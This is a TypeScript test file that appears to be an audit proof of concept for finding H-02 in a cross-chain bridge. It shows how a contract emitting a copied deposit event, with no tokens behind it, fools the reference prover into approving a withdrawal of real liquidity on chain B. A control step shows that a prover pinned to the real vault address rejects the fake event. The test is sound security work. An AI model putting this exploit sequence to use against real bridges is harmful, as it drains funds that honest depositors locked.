import { beforeEach, describe, expect, it } from 'vitest'
import { roles } from '../src/accounts.js'
import { artifacts } from '../src/artifacts.js'
import { fundedDeposit, tokenBalance, withdraw } from '../src/bridge.js'
import { chainA, chainB, walletFor } from '../src/chains.js'
import { deployContract, deployFreshBridge, type BridgeDeployment } from '../src/deploy.js'
import { proveDeposit } from '../src/prover/guest.js'
import { fetchWitness } from '../src/prover/host.js'
import { relayBlock } from '../src/relayer.js'

let bridge: BridgeDeployment

beforeEach(async () => {
  bridge = await deployFreshBridge()
})

/**
 * Specification claim: `BridgeInputs` carries no source vault address, and the deploy script
 * computes `programVKey` before the vaults exist, so a sound circuit has no way to tell the
 * real vault's `DepositInitiated` event from a copy (H-02, build-contract.md "Reference prover",
 * step 4: "finds the DepositInitiated log ... by topic 0 only").
 *
 * Result: an attacker deploys a contract that emits the same event with no tokens behind it.
 * The reference prover accepts it, and the attacker withdraws real liquidity on chain B.
 */
describe('H-02: fake deposit emitter lets an attacker mint a withdrawal from nothing', () => {
  it('withdraws real chain B liquidity from a fake chain A event', async () => {
    // Real liquidity: an honest user locks tokens in chain B's vault via an opposite-direction deposit.
    await fundedDeposit({
      side: bridge.b,
      user: roles.liquidityProvider,
      recipient: roles.liquidityProvider.address,
      amount: 1_000_000n,
      targetChainId: 1,
    })

    const fakeEmitter = await deployContract(chainA, artifacts.fakeEmitter(), [])
    const fakeHash = await walletFor(chainA, roles.attacker).writeContract({
      address: fakeEmitter,
      abi: artifacts.fakeEmitter().abi,
      functionName: 'fakeDeposit',
      args: [bridge.a.token, roles.attacker.address, 1_000_000n, `0x${'ff'.repeat(32)}` as const, 369],
    })
    await chainA.publicClient.waitForTransactionReceipt({ hash: fakeHash })

    // The relayer syncs blocks, not deposits: it has no way to know this block holds a fake event.
    const witness = await fetchWitness(chainA.publicClient, fakeHash)
    const proof = await proveDeposit(witness, 1)
    await relayBlock({
      committee: bridge.committeeA,
      blockHash: proof.inputs.confirmedBlockRoot,
      period: 2,
      destination: chainB,
      lightClient: bridge.b.lightClient,
      account: roles.honestRelayer,
    })

    const balanceBefore = await tokenBalance(bridge.b, bridge.b.token, roles.attacker.address)
    await withdraw({ side: bridge.b, caller: roles.attacker, proof })
    const balanceAfter = await tokenBalance(bridge.b, bridge.b.token, roles.attacker.address)
    expect(balanceAfter - balanceBefore).toBe(1_000_000n)

    // Control: a prover that pins the emitter to the real vault address rejects the same witness.
    await expect(proveDeposit(witness, 1, { pinnedEmitter: bridge.a.vault })).rejects.toThrow(/pinned emitter/)
  })
})
